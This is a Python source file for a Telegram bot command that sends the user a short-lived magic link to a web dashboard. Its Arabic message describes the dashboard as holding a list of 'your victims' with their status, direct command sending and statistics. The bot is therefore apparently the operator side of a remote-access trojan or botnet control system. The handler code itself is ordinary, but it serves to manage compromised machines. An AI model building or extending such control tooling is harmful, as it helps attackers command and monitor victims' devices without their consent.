# bot_handlers/commands/dashboard.py
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import bot
from imports_manager import get_or_create_user
from logging_config import get_logger

from ..helpers import h

logger = get_logger("bot_handlers.commands.dashboard")


@bot.message_handler(commands=['dashboard', 'dash', 'panel_web', 'web'])
def dashboard_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    logger.info(f"/dashboard from {user_id}")

    try:
        get_or_create_user(
            user_id,
            message.from_user.username or "Unknown",
            message.from_user.first_name or "User"
        )

        from web_dashboard import generate_magic_link
        link = generate_magic_link(user_id)

        if not link:
            bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
            return

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀 ادخل لوحة التحكم", url=link))

        bot.send_message(
            chat_id,
            "🌐 <b>لوحة التحكم الويب</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "⏰ <i>الرابط صالح لمدة 5 دقائق فقط</i>\n"
            "🛡️ <i>لا تشاركه مع أي شخص</i>\n\n"
            "💡 <b>يحتوي على:</b>\n"
            "• قائمة ضحاياك مع الحالة\n"
            "• إرسال أوامر مباشرة\n"
            "• إحصائيات مفصلة",
            parse_mode="HTML",
            reply_markup=markup
        )
    except Exception as e:
        logger.exception(f"dashboard_command error: {e}")
        bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
